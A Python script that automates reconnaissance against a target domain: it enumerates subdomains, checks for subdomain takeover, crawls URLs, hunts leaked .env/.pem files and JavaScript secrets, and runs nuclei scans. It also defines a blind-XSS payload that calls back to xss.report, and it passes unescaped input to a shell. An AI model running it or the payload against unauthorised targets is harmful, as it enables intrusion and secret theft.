#!/usr/bin/env python3
import os
import sys
import subprocess
import logging
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# === Config === #
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
BLIND_XSS = '<script src=https://xss.report/c/mt8848></script>'
OUTPUT_DIR = Path(__file__).parent.resolve() / "recon_output"
MAX_WORKERS = 50
TIMEOUT = 120

# === Setup === #
def setup_dirs(domain: str):
    paths = {
        'subs': OUTPUT_DIR / domain / 'subdomains',
        'urls': OUTPUT_DIR / domain / 'urls',
        'vulns': OUTPUT_DIR / domain / 'vulns',
        'js': OUTPUT_DIR / domain / 'js',
        'loot': OUTPUT_DIR / domain / 'loot',
    }
    for p in paths.values():
        p.mkdir(parents=True, exist_ok=True)
    return paths

# === Helpers === #
def run_cmd(cmd: str, timeout: int = TIMEOUT) -> list:
    logging.info(f"[RUN] {cmd}")
    try:
        proc = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        proc.check_returncode()
        return proc.stdout.splitlines()
    except subprocess.CalledProcessError as e:
        logging.warning(f"Cmd failed: {cmd}\n{e.stderr.strip()}")
        return []
    except subprocess.TimeoutExpired:
        logging.warning(f"Cmd timeout: {cmd}")
        return []


def write_list(path: Path, items: list):
    unique = sorted(set(items))
    path.write_text("\n".join(unique))


def read_list(path: Path) -> list:
    if path.exists():
        return path.read_text().splitlines()
    return []

# === Recon Phases === #

def subdomain_enum(domain: str) -> list:
    out = paths['subs'] / 'all.txt'
    if out.exists():
        logging.info('[SKIP] Subdomain enumeration already done.')
        return read_list(out)
    logging.info('[+] Subdomain Enumeration: subfinder + crt.sh')
    subs = run_cmd(f"subfinder -silent -d {domain}")
    certs = run_cmd(
        f'curl -s "https://crt.sh/?q=%25.{domain}&output=json" '
        '| jq -r ".[].name_value" | sed "s/\*\.//g"'
    )
    all_subs = subs + certs
    write_list(out, all_subs)
    return read_list(out)


def live_check(domain: str, subdomains: list) -> list:
    out = paths['subs'] / 'live.txt'
    if out.exists():
        logging.info('[SKIP] Live check already done.')
        return read_list(out)
    logging.info('[+] Live host check: httpx-go')
    temp = paths['subs'] / 'temp_subs.txt'
    write_list(temp, subdomains)
    live = run_cmd(f"httpx-go -silent -l {temp} -ports 80,443,8080,8000,8888 -threads {MAX_WORKERS}")
    # enforce full URL
    live = [u if u.startswith('http') else f'https://{u}' for u in live]
    write_list(out, live)
    return live


def takeover_check(domain: str):
    infile = paths['subs'] / 'live.txt'
    out = paths['subs'] / 'subzy.txt'
    if out.exists():
        logging.info('[SKIP] Takeover check done.')
        return
    logging.info('[+] Subzy takeover check')
    run_cmd(f'subzy run --targets {infile} --concurrency 100 --hide_fails --verify_ssl > {out}')


def url_gather(domain: str, hosts: list) -> list:
    out = paths['urls'] / 'urls.txt'
    if out.exists():
        logging.info('[SKIP] URL gathering done.')
        return read_list(out)
    logging.info('[+] URL gathering: gau, katana, waymore, hakrawler, xnLinkFinder')
    links = []
    links += run_cmd(f"echo {domain} | gau --mc 200")
    links += run_cmd(f"echo {domain} | katana -d 5 -silent | grep '='")
    links += run_cmd(f"waymore -i {domain} -mode U")
    links += run_cmd(f"echo {domain} | hakrawler -d 2 -insecure -subs -t 10")

    # parallel xnLinkFinder
    with ThreadPoolExecutor(max_workers=10) as exe:
        futures = {exe.submit(run_cmd, f"xnLinkFinder -i {u} -sf {domain}"): u for u in hosts}
        for fut in as_completed(futures):
            links += fut.result() or []

    # filter & store
    links = [u for u in links if u.startswith('http')]
    write_list(out, links)
    return links


def leak_files(domain: str, urls: list):
    out = paths['loot'] / 'files.txt'
    if out.exists():
        logging.info('[SKIP] File leak hunting done.')
        return
    logging.info('[+] Hunting leaked files by extension')
    exts = ['.env', '.git', '.sql', '.bak', '.log', '.json', '.xml', '.zip', '.tar.gz', '.pptx', '.pem']
    leaks = [u for u in urls if any(u.endswith(ext) for ext in exts)]
    write_list(out, leaks)
    logging.info(f"[+] {len(leaks)} leaked files found.")


def js_secrets(domain: str, urls: list):
    out = paths['js'] / 'secrets.txt'
    if out.exists():
        logging.info('[SKIP] JS secrets done.')
        return
    logging.info('[+] JS secret extraction via TruffleHog')
    js_urls = [u for u in urls if u.lower().endswith('.js')]
    tmp = paths['js'] / 'js_urls.txt'
    write_list(tmp, js_urls)
    secrets = []
    for js in js_urls:
        content = run_cmd(f"curl -s {js}")
        Path('js_tmp.txt').write_text("\n".join(content))
        secrets += run_cmd('trufflehog filesystem --json js_tmp.txt')
    write_list(out, secrets)


def scan_vulns(domain: str, urls: list):
    out = paths['vulns'] / 'nuclei.txt'
    if out.exists():
        logging.info('[SKIP] Nuclei scan done.')
        return
    logging.info('[+] Nuclei scan: cves, misconfiguration, exposures, default-logins')
    tmp = paths['vulns'] / 'temp_urls.txt'
    write_list(tmp, urls)
    run_cmd(
        f'nuclei -l {tmp} -t cves/ -t misconfiguration/ -t exposures/ '
        f'-t default-logins/ -o {out} -silent'
    )

# === MAIN === #
if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: python3 {Path(__file__).name} <domain>")
        sys.exit(1)
    domain = sys.argv[1].strip()
    paths = setup_dirs(domain)
    try:
        subs = subdomain_enum(domain)
        live = live_check(domain, subs)
        takeover_check(domain)
        urls = url_gather(domain, live)
        leak_files(domain, urls)
        js_secrets(domain, urls)
        scan_vulns(domain, urls)
        print(f"\n[*] Recon complete. Output in {OUTPUT_DIR / domain}")
    except KeyboardInterrupt:
        logging.warning("Interrupted. Partial results saved.")
    except Exception as e:
        logging.error(f"Error: {e}. Partial results saved.")
